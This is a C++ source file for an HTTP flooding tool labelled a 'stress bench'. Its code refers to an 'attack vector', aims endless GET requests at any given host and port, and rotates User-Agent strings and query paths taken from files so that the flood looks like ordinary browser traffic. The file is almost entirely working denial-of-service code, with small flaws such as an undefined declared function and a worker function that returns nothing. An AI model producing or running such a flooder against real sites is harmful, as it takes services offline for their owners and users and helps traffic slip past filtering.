#include <cstdlib>
#include <iostream>

#include "httpRequest.h"
#include "randomzie.h"
#include "tcpClient.h"
#include "threadPool.h"
#include "utilities.h"
#include <atomic>
#include <fstream>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>

using namespace std;

sockaddr_in serverAddr;

typedef enum { STRESS_BENCH_COMMON = 0 } attackType;

attackType attackVector = STRESS_BENCH_COMMON;

// User-Agent
string userAgentFile;
vector<string> userAgents;

// Queries
string queriesFile;
vector<string> queries;

// Remote socket
string hostName;
ushort port = 80;

/* Terminator */
bool terminated = false;

/* Common bench */
void *commonBenchW(void *dataPtr);

/* Undefined bench */
void *undefineBenchW(void *dataPtr);

void eventHandler(int signal);

void getAddrByName(char *remoteHost, ushort remotePort,
                   sockaddr_in *addrServer);
void getAddrByName(const char *remoteHost, ushort remotePort,
                   sockaddr_in *addrServer);

#define checkParam(param)                                                      \
    if (string(argv[c]).compare(param) == 0 && c + 1 < argc)
#define checkValue(value) if (string(argv[c]).compare(value) == 0)

std::atomic<int> threadCount;

/* Just common thing */
int main(int argc, char *argv[]) {
    threadPool myThread;
    threadCount = 0;
    for (int c = 0; c < argc; c++) {
        // Host param
        checkParam("--host") { hostName = argv[++c]; }

        // Port param
        checkParam("--port") { port = stoi(string(argv[++c])); }

        // User agent file
        checkParam("--user-agent") {
            userAgentFile = argv[++c];
            if (userAgentFile.length() > 0) {
                userAgents = readFile(userAgentFile);
            }
        }

        // Queries files
        checkParam("--queries") {
            queriesFile = argv[++c];
            if (queriesFile.length() > 0) {
                queries = readFile(queriesFile);
            }
        }

        // Get attack vector
        checkParam("--type") {
            c++;
            checkValue("common") { attackVector = STRESS_BENCH_COMMON; }
        }
    }

    if (hostName.empty()) {
        cout << "Invalid host name\n";
        return -1;
    }
    if (port <= 0) {
        cout << "Invalid port\n";
        return -1;
    }

    getAddrByName(hostName.c_str(), port, &serverAddr);

    switch (attackVector) {
    case STRESS_BENCH_COMMON:
    default:

        break;
    }

    // Catch Ctrl+C
    signal(SIGINT, eventHandler);
    myThread.create(commonBenchW);
    myThread.join();
    while (!terminated) {
        usleep(1000000);
    }
    return 0;
}

void *commonBenchW(void *dataPtr) {
    tcpClient myClient;
    randomize rndSrc;
    srand(nanoTime());
    httpRequest request;
    char buffer[1024];
    char *data = nullptr;
    int myThreadId = threadCount++;

    request.push("Host", hostName);
    request.push(
        "User-Agent",
        "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0");
    request.push(
        "Accept",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    request.push("Accept-Language", "en-US,en;q=0.5");
    request.push("Accept-Encoding", "deflate, br");
    request.push("Connection", "keep-alive");
    while (!terminated) {

        if (queries.size() > 0) {
            request.uri = queries[rand() % queries.size()];
        }
        if (userAgents.size() > 0) {
            request.eraseField("User-Agent");
            request.push("User-Agent", userAgents[rand() % userAgents.size()]);
        }

        data = request.get();
        myClient.open();
        myClient.connect(serverAddr);
        myClient.send((void *)data, (size_t)strlen(data));
        myClient.recv(buffer, 1023);
        buffer[1023] = 0x0;
        myClient.close();
    }
}

void getAddrByName(const char *remoteHost, ushort remotePort,
                   sockaddr_in *addrServer) {
    getAddrByName((char *)remoteHost, remotePort, addrServer);
}

void getAddrByName(char *remoteHost, ushort remotePort,
                   sockaddr_in *addrServer) {
    hostName = remoteHost;
    struct hostent *server;
    server = gethostbyname(remoteHost);
    memset(addrServer, 0x0, sizeof(sockaddr_in));
    addrServer->sin_family = AF_INET;
    memcpy(&addrServer->sin_addr.s_addr, server->h_addr, server->h_length);
    addrServer->sin_port = htons(remotePort);
}

void eventHandler(int signal) {
    // Wait for it
    if (!terminated) {
        cout << "\nTerminating threads...\n";
        terminated = true;
    }
}